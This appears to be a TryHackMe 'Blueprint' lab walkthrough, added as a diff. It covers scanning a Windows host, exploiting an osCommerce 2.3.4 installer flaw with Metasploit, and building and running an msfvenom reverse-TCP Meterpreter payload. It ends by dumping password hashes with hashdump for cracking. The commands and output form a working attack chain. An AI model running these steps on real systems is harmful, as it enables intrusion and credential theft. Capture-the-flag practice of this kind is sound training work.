@@ -1,0 +1,124 @@
+██████╗ ██╗     ██╗   ██╗███████╗██████╗ ██████╗ ██╗███╗   ██╗████████╗
+██╔══██╗██║     ██║   ██║██╔════╝██╔══██╗██╔══██╗██║████╗  ██║╚══██╔══╝
+██████╔╝██║     ██║   ██║█████╗  ██████╔╝██████╔╝██║██╔██╗ ██║   ██║   
+██╔══██╗██║     ██║   ██║██╔══╝  ██╔═══╝ ██╔══██╗██║██║╚██╗██║   ██║   
+██████╔╝███████╗╚██████╔╝███████╗██║     ██║  ██║██║██║ ╚████║   ██║   
+╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝     ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝   
+            https://tryhackme.com/room/blueprint            
+                                                           
+                                                           
+                                                           
+     __                       
+  /\ \ \_ __ ___   __ _ _ __  
+ /  \/ / '_ ` _ \ / _` | '_ \ 
+/ /\  /| | | | | | (_| | |_) |
+\_\ \/ |_| |_| |_|\__,_| .__/ 
+                       |_|    
+                       
+{{nmap -sV -T4 [Machine IP]}}
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-22 01:22 UTC
+Warning: 10.10.202.196 giving up on port because retransmission cap hit (6).
+Nmap scan report for 10.10.202.196
+Host is up (0.36s latency).
+Not shown: 981 closed tcp ports (conn-refused)
+PORT      STATE    SERVICE        VERSION
+80/tcp    open     http           Microsoft IIS httpd 7.5
+135/tcp   open     msrpc          Microsoft Windows RPC
+139/tcp   open     netbios-ssn    Microsoft Windows netbios-ssn
+443/tcp   open     ssl/http       Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+445/tcp   open     microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
+1035/tcp  filtered multidropper
+1059/tcp  filtered nimreg
+1199/tcp  filtered dmidi
+3306/tcp  open     mysql          MariaDB (unauthorized)
+3889/tcp  filtered dandv-tester
+7443/tcp  filtered oracleas-https
+8080/tcp  open     http           Apache httpd 2.4.23 (OpenSSL/1.0.2h PHP/5.6.28)
+8254/tcp  filtered unknown
+49152/tcp open     msrpc          Microsoft Windows RPC
+49153/tcp open     msrpc          Microsoft Windows RPC
+49154/tcp open     msrpc          Microsoft Windows RPC
+49158/tcp open     msrpc          Microsoft Windows RPC
+49159/tcp open     msrpc          Microsoft Windows RPC
+49160/tcp open     msrpc          Microsoft Windows RPC
+Service Info: Hosts: www.example.com, BLUEPRINT, localhost; OS: Windows; CPE: cpe:/o:microsoft:windows
+                                                           
+--Going to http://[Machine IP]:80 gives us a 404, but visiting on port 8080 shows us an index of / page.
+--Click around and eventually go to /oscommerce-2.3.4/catalog/, which reveals a pretty...basic looking website lol.
+--I couldn't really find anything else going on, so decided to look for "oscommerce 2.3.4" exploits, and first found this: https://www.exploit-db.com/exploits/44374
+--However, after modifying the code and trying different payloads to specify within it, I was unable to get anywhere. 
+--I looked on Metasploit next for a module and came across this:
+
+msf6 > search oscommerce
+
+Matching Modules
+================
+
+   #  Name                                                      Disclosure Date  Rank       Check  Description
+   -  ----                                                      ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/oscommerce_filemanager                2009-08-31       excellent  No     osCommerce 2.2 Arbitrary PHP Code Execution
+   1  exploit/multi/http/oscommerce_installer_unauth_code_exec  2018-04-30       excellent  Yes    osCommerce Installer Unauthenticated Code Execution
+
+--Select option 1:
+{{use 1}}
+
+--Before running, we need to make a few changes to the options:
+	Set RHOSTS [Machine IP]
+	Set LHOST [Your tun0 IP]
+	Set URI /oscommerce-2.3.4/catalog/install/
+
+--Type "exploit"
+
+msf6 exploit(multi/http/oscommerce_installer_unauth_code_exec) > exploit
+
+[*] Started reverse TCP handler on 10.2.5.216:4444 
+[*] Sending stage (39927 bytes) to 10.10.202.196
+[*] Meterpreter session 1 opened (10.2.5.216:4444 -> 10.10.202.196:49369) at 2022-11-22 01:58:41 +0000
+
+meterpreter > getuid
+Server username: SYSTEM
+
+--Trying to run hashdump gives an error, and tells us the "priv" extension is not supported:
+Loading extension priv...
+[-] Failed to load extension: The "priv" extension is not supported by this Meterpreter type (php/windows)
+[-] The "priv" extension is supported by the following Meterpreter payloads:
+[-]   - windows/x64/meterpreter*
+[-]   - windows/meterpreter*
+
+--Switching the payload in the options causes this exploit to fail.
+--Let's try to use msfvenom to create a payload with one of the supported Meterpreter types above and get another reverse shell.
+
+--On your machine:
+{{msfvenom -p windows/meterpreter/reverse_tcp LHOST=[your tun0 IP] LPORT=[listening port] -f exe > shell.exe}}
+
+--Start another listener while you're at it:
+--Open msfconsole in a new tab, and use /exploit/multi/handler
+--Set LHOST to your tun0 address, and LPORT to the port you specified above.
+--Set payload /windows/meterpreter/reverse_tcp
+--Type "run"
+
+--Go back to your other meterpreter shell and type:
+{{upload shell.exe}} *Note: it will first look from whatever directory you were in before starting msfconsole*
+
+--And now, execute the file:
+{{execute -f shell.exe}}
+
+[*] Started reverse TCP handler on 10.2.5.216:1234 
+[*] Sending stage (175686 bytes) to 10.10.202.196
+[*] Meterpreter session 6 opened (10.2.5.216:1234 -> 10.10.202.196:49380) at 2022-11-22 02:26:12 +0000
+[*] Meterpreter session 7 opened (10.2.5.216:1234 -> 10.10.202.196:49381) at 2022-11-22 02:26:22 +0000
+
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+--To answer the first question, use hashdump again:
+
+meterpreter > hashdump
+Administrator:REDACTED:::
+Guest:REDACTED:::
+Lab:REDACTED::
+
+--Plug the hash for Lab into hashes.com or crackstation to receive the answer.
+
+
+--There is no privilege escalation necessary - congrats! Root flag is in C:\Users\Administrator\Desktop\
